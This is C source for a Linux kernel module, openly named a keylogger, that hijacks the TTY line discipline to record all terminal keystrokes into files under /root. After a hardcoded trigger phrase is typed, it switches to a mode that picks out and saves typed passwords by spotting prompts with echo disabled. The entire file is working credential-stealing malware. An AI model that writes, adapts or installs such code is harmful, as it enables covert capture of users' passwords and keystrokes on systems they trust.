#define __KERNEL_SYSCALLS__
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/tty.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <asm/io.h>

#define N_SH1TTY               N_TTY
#define BUFFER_MAX_SIZE        512
#define LOG_MAX_SIZE           200
#define LOG_NAME_SIZE          100
#define TTY_MAX_COUNT          50
#define DEBUG
#define UNLOCK_SMART_MODE      "G1v3m3p4ssw0rdz"
#define PASSWORD_FOLLOWS       "Password: "
#define BACK_SPACE_CHAR1       127
#define BACK_SPACE_CHAR2       8
#define DUMB_MODE              0
#define SMART_MODE             1

struct tty_logger {
	struct tty_struct *tty;
	char buf[BUFFER_MAX_SIZE];
	unsigned lastpos;
	int pass;
};

static int logging_mode;
static struct tty_logger *ttys[TTY_MAX_COUNT] = { NULL };
static struct tty_ldisc_ops sh1tty_ldisc;
static struct semaphore logging_sem;
static int(*orig_receive_buf2)(struct tty_struct *, const unsigned char *cp,
                               char *fp, int count);

#ifdef DEBUG
# define debug_print(format, args...) printk(KERN_INFO format, ##args)
#else
# define debug_print(format, args...)
#endif

#define TTY_NUMBER(tty)       ((tty)->index + (tty)->driver->name_base)
#define TTY_LOGGER(tty)       (TTY_NUMBER(tty) % TTY_MAX_COUNT)
#define IS_PASSWD(tty)        (L_ICANON(tty) && !L_ECHO(tty))

int write_to_file(char *logfile, const char *buf, int size)
{
	int ret = 0;
	struct file *f = NULL;
	mm_segment_t old_fs;

	if(down_interruptible(&logging_sem)) {
		return -ERESTARTSYS;
	}

	old_fs = get_fs();
	set_fs(get_ds());

	f = filp_open(logfile, O_CREAT|O_APPEND, 00600);

	if (IS_ERR(f)) {
		ret = -1;
	} else {
		if (f->f_op && f->f_op->write) {
			f->f_op->write(f, buf, size, &f->f_pos);
		} else {
			ret = -1;
		}

		ret = filp_close(f,NULL);
	}
	set_fs(old_fs);

	up(&logging_sem);

	return ret;
}

	static inline
void check_user_cmd(struct tty_logger *tty_logger)
{
	if (tty_logger->lastpos < sizeof(UNLOCK_SMART_MODE) - 1) {
		return;
	}

	if (memcmp(tty_logger->buf + tty_logger->lastpos + 1 -
	           sizeof(UNLOCK_SMART_MODE), UNLOCK_SMART_MODE,
	           sizeof(UNLOCK_SMART_MODE) - 1)) {
		return;
	}

	logging_mode = SMART_MODE;
	tty_logger->lastpos = 0;
}

void log_bytes_to_file(struct tty_logger *tty_logger, char *log_name)
{
	char log[LOG_MAX_SIZE];
	char *buf;
	char *ptr;
	size_t cmd_size;

	/* DUMB mode */

	if (logging_mode == DUMB_MODE) {
		write_to_file(log_name, tty_logger->buf, tty_logger->lastpos);
		tty_logger->lastpos = 0;
		return;
	}

	/* SMART mode */

	if (!tty_logger->pass) {
		/* Log login/command (currently typing a password) */

		for (cmd_size = 0;
		     cmd_size < BUFFER_MAX_SIZE && tty_logger->buf[cmd_size] != '\x0A';
		     cmd_size++);

		write_to_file(log_name, tty_logger->buf, cmd_size + 1);
	} else {
		/* Log password */

		strcpy(log, PASSWORD_FOLLOWS);

		for (buf = tty_logger->buf, ptr = log + strlen(PASSWORD_FOLLOWS);
		     buf < tty_logger->buf + tty_logger->lastpos;
		     buf++, ptr++)
		{
			if (*buf == BACK_SPACE_CHAR1 || *buf == BACK_SPACE_CHAR2) {
				ptr--;
				continue;
			}

			*ptr = *buf;
		}

		write_to_file(log_name, log, ptr - log + 1);
	}

	tty_logger->lastpos = 0;
}

void log_bytes(struct tty_logger *tty_logger)
{
	char log_name[LOG_NAME_SIZE];

	if (logging_mode == DUMB_MODE) {
		snprintf(log_name, sizeof(log_name), "/root/log_%s", tty_logger->tty->name);
	} else {
		snprintf(log_name, sizeof(log_name), "/root/pw_%s", tty_logger->tty->name);
	}

	log_bytes_to_file(tty_logger, log_name);
}

	static
void add_bytes_to_logbuf(struct tty_logger *tty_logger,
                         const char *buf, size_t size)
{
	const char *ptr;

	ptr = buf;

	while (size > 0) {
		while (tty_logger->lastpos != BUFFER_MAX_SIZE && size > 0) {
			tty_logger->buf[tty_logger->lastpos] = *ptr++;
			size--;
			tty_logger->lastpos++;
		}

		if (tty_logger->lastpos != BUFFER_MAX_SIZE) {
			break;
		}

		if (logging_mode == SMART_MODE && !tty_logger->pass) {
			/* Smart mode commands are logged within log_handler */
			tty_logger->lastpos = 0;
			continue;
		}

		log_bytes(tty_logger);
	}

	/* Flush if the buffer ends with a CR/LF */

	if (tty_logger->lastpos && tty_logger->buf[tty_logger->lastpos - 1] == 0x0D) {
		tty_logger->buf[tty_logger->lastpos - 1] = 0x0A;

		if (!(logging_mode == SMART_MODE && !tty_logger->pass)) {
			/* Log only in dumb mode and when there's a password */
			log_bytes(tty_logger);
		} else {
			/* Don't log cmd when it doesn't ask for a password */
			tty_logger->lastpos = 0;
		}
	}
}

void log_handler(struct tty_struct *tty, const char *buf, int size)
{
	struct tty_logger *tty_logger;
	char *ptr;

	if (!buf) {
		return;
	}

	if (!(ptr = kmalloc(sizeof(char) * size + 2, GFP_ATOMIC))) {
		return;
	}

	if (copy_from_user(ptr, buf, size)) {
		kfree(ptr);
		return;
	}

	tty_logger = ttys[TTY_NUMBER(tty)];

	if (!tty_logger) {
		if (!(tty_logger = kmalloc(sizeof(struct tty_logger), GFP_ATOMIC))) {
			return;
		}

		tty_logger->tty = tty;
		memset(tty_logger->buf, 0, sizeof(tty_logger->buf));
		tty_logger->lastpos = 0;
		ttys[TTY_NUMBER(tty)] = tty_logger;
		tty_logger->pass = IS_PASSWD(tty);
	}

	if (logging_mode == SMART_MODE &&
	    !tty_logger->pass &&
	    IS_PASSWD(tty)) {
		/* Last line was not a password, but the program is now reading a password.
		 * Log previous line. */

		log_bytes(tty_logger);
		tty_logger->pass = IS_PASSWD(tty);
	}

	add_bytes_to_logbuf(tty_logger, ptr, size);
	check_user_cmd(tty_logger);
	tty_logger->pass = IS_PASSWD(tty);

	kfree(ptr);
}

int sh1tty_receive_buf2(struct tty_struct *tty, const unsigned char *buf,
                        char *fp, int nr)
{
	log_handler(tty, buf, nr);

	return orig_receive_buf2(tty, buf, fp, nr);
}

static int __init keylogger_register(void)
{
	int err = -1;

	sema_init(&logging_sem, 1);

	n_tty_inherit_ops(&sh1tty_ldisc);

	logging_mode = DUMB_MODE;

	orig_receive_buf2 = sh1tty_ldisc.receive_buf2;
	sh1tty_ldisc.receive_buf2 = &sh1tty_receive_buf2;
	sh1tty_ldisc.receive_buf = &sh1tty_receive_buf2;

	if ((err = tty_unregister_ldisc(N_TTY))) {
		debug_print("Failed to unregister ldisc N_TTY... [%d]\n", err);
	}

	if ((err = tty_register_ldisc(N_SH1TTY, &sh1tty_ldisc))) {
		debug_print("Failed to register ldisc... [%d]\n", err);
		return err;
	}

	debug_print("Successfully registered ldisc N_TTY...\n");

	return err;
}

static void __exit keylogger_unregister(void)
{
	int err;
	int i;

	err = tty_unregister_ldisc(N_SH1TTY);
	debug_print("unregister_ldisc(N_TTY) = %d\n", err);

	for (i = 0; i < TTY_MAX_COUNT; i++) {
		if (ttys[i]) {
			kfree(ttys[i]);
		}
	}
}

MODULE_LICENSE ("GPL");
MODULE_AUTHOR("Dan Blair");
module_init(keylogger_register);
module_exit(keylogger_unregister);
